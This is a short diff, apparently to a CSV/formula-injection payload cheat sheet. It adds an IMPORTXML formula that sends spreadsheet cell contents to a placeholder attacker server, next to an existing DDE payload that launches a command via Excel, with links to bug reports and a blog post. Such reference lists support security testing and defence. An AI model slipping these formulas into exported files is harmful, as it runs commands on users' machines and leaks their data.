@@ -18,6 +18,9 @@
 %0A-2+3+cmd|' /C calc'!D2      # %0A is NewLine which excel will
                                # ref: https://bugzilla.mozilla.org/show_bug.cgi?id=1259881
                                #      https://bugzilla.mozilla.org/show_bug.cgi?id=1263581
+
+# XML Import: http://georgemauer.net/2017/10/07/csv-injection.html
+=IMPORTXML(CONCAT(""http://some-server-with-log.evil?v="", CONCATENATE(A2:E2)), ""//a"")"
 ```
 
 ### Filter Evasion:
